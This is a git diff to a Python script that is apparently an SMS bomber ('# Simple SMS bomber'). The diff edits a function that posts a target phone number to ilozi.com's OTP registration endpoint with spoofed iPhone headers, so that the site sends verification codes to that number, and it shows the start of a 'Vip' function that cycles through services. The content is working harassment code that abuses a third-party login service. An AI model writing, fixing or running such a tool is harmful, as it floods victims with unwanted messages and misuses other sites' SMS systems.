@@ -44,20 +44,12 @@ def check_internet():
 
 
 def ilozi(phone):
-    """
-    تابع ارسال کد تأیید برای سایت ilozi.com
-    شماره تلفن باید با +98 باشد.
-    """
-    import requests
-
     url = "https://ilozi.com/wp-json/digits/v1/send_otp"
-    
     payload = {
-        "digits_reg_mobile": phone.split("+98")[1],  # شماره بدون +98
+        "digits_reg_mobile": "0" + phone.split("+98")[1],  # شماره با صفر شروع
         "digits_reg_countrycode": "98",
-        "type": "register",
+        "type": "register"
     }
-
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Accept": "application/json, */*; q=0.1",
@@ -65,25 +57,22 @@ def ilozi(phone):
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "Origin": "https://ilozi.com",
         "Referer": "https://ilozi.com/?login=true",
-        "X-Requested-With": "XMLHttpRequest",
+        "X-Requested-With": "XMLHttpRequest"
     }
-
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('success') is True:
-                print(f"{g}(ilozi) {a}Code Sent")
-                return True
-            else:
-                print(f"{r}(ilozi) {a}Failed or No Response")
-                return False
+        response = post(url, data=payload, headers=headers, timeout=5)
+        if response.status_code == 200 and response.json().get("success") is True:
+            print(f'{g}(ilozi) {a}Code Sent')
+            return True
         else:
-            print(f"{r}(ilozi) {a}Failed or No Response")
+            print(f'{r}[-] (ilozi) Failed or No Response{a}')
             return False
-    except:
-        print(f"{r}(ilozi) {a}Failed or No Response")
+    except Exception as e:
+        print(f'{r}[!] ilozi Exception: {e}{a}')
         return False
+
+
+
 # Simple SMS bomber
 def Vip(phone, Time):
     services = [
